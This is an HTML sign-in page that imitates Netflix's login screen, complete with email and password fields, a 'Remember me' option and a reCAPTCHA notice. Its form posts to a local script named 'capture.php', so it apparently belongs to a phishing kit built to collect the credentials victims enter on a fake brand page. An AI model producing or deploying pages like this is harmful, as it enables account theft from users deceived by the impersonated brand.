<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign In</title>
  <link rel="stylesheet" href="./style.css">
</head>
<body>
  <div class="signin-container">
    <form action="./capture.php" method="POST"> 
      <h1>Sign In</h1>
      <div class="form-group">
        <input type="text" id="email" placeholder="Email or mobile number" required>
        <p class="error">Please enter a valid email address or phone number.</p>
      </div>
      <div class="form-group">
        <input type="password" id="password" placeholder="password" required>
        <p class="error">Your password must contain between 4 and 60 characters.</p>
      </div>
      <button type="submit" class="btn btn-primary">Sign In</button>
      <p class="or">OR</p>
      <button type="button" class="btn btn-secondary">Use a sign-in code</button>
      <div class="extras">
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="remember-me">
          <input type="checkbox" id="remember-me">
          <label for="remember-me">Remember me</label>
        </div>
      </div>
      <p class="signup">
        New to Netflix? <a href="#">Sign up now.</a>
      </p>
      <p class="recaptcha">
        This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a>
      </p>
    </form>
  </div>
</body>
</html>
